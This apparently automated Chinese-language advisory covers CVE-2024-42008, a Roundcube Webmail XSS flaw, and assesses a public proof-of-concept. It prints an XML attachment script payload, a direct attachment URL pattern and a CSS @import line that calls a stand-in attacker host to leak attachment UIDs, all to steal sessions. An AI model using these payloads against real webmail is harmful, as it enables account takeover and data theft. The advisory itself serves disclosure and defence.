## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)